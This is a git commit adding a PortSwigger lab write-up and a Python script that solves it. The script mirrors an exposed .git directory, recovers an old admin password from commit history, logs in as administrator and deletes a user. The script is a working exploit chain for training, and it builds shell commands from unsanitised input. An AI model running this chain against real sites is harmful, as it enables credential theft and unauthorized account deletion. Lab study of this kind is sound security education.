85952b403da0f514448e1f76dfd02c2967161f69
Frank Leitner <gitlab@frank-leitner.de>
2021-10-04 20:15:11 +0200

    Add Lab: Information disclosure in version control history

---
+++ 06_information_disclosure/Information_disclosure_in_version_control_history/README.md
@@ -0,0 +1,42 @@
+# Lab: Information disclosure in version control history
+
+Lab-Link: <https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history>  
+Difficulty: PRACTITIONER  
+Python script: [script.py](script.py)  
+
+## Known information
+
+- Lab discloses information in its version control history
+- Goals:
+  - Obtain administrator password
+  - Delete user `carlos`
+
+## Steps
+
+### Analysis
+
+The lab is again our favourite shop website. Browsing around does not reveal anything unusual. As we do not have known credentials, we need additional means of finding content.
+
+This can be a wild guess based on the title, Burp's content discovery or any other directory search tool (e.g. gobuster, wfuzz, ...). Very quickly, it discovers an interesting directory:
+
+![dirsearch_result](img/dirsearch_result.png)
+
+I quickly mirror the directory with wget to create a local copy with the following line:
+
+![download_git_directory](img/download_git_directory.png)
+
+Checking the git log, an interesting commit message is shown in the last commit:
+
+![git_log](img/git_log.png)
+
+So go back to the commit before:
+
+![get_old_commit](img/get_old_commit.png)
+
+And check the content of the file:
+
+![admin_password](img/admin_password.png)
+
+Now it is simply a matter of logging in with `administrator:ehr6dyudul3bxk8n3prd`, access the `Admin panel` and delete user `carlos` to solve the lab:
+
+![success](img/success.png)
---
+++ 06_information_disclosure/Information_disclosure_in_version_control_history/script.py
@@ -0,0 +1,70 @@
+#!/usr/bin/env python3
+# Lab: Information disclosure in version control history
+# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
+# Difficulty: PRACTITIONER
+from bs4 import BeautifulSoup
+import os
+import requests
+import subprocess
+import sys
+import tempfile
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+
+def get_csrf_token(text):
+    soup = BeautifulSoup(text, 'html.parser')
+    result = soup.find('input', attrs={'name': 'csrf'})['value']
+    return result
+
+
+def login(client, host, password):
+    url = f'{host}/login'
+    data = {'csrf': get_csrf_token(client.get(url).text),
+            'username': 'administrator',
+            'password': password}
+    res = client.post(url, data=data)
+    return f'Your username is: administrator' in res.text
+
+
+def main():
+    try:
+        host = sys.argv[1].strip().rstrip('/')
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <HOST>')
+        print(f'Exampe: {sys.argv[0]} http://www.example.com')
+        sys.exit(-1)
+
+    client = requests.Session()
+    client.verify = False
+    client.proxies = proxies
+    giturl = f'{host}/.git'
+
+    with tempfile.TemporaryDirectory() as tmpdirname:
+        print(f'[+] Created temporary directory: {tmpdirname}')
+
+        print(f'[+] Downloading .git directory')
+        os.system(f'wget --mirror -I .git --directory-prefix={tmpdirname} {giturl} 2>/dev/null >&2')
+
+        print(f'[+] Switch to previous commit and extract password')
+        cmd = f'cd {tmpdirname}/*; git checkout HEAD^ 2>/dev/null >&2; cat admin.conf'
+        result = subprocess.check_output(cmd, shell=True)
+        password = result.decode().strip().split('=')[1]
+        print(f'[+] Administrator password found: {password}')
+
+        if not login(client, host, password):
+            print(f'[-] Failed to login as administrator')
+            sys.exit(-2)
+        print(f'[+] Logged in as administrator')
+
+        url = f'{host}/admin/delete?username=carlos'
+        if 'Congratulations, you solved the lab!' not in client.get(url).text:
+            print(f'[-] Failed to delete user carlos')
+            sys.exit(-3)
+
+        print(f'[+] Deleted user carlos, lab solved')
+
+
+if __name__ == "__main__":
+    main()
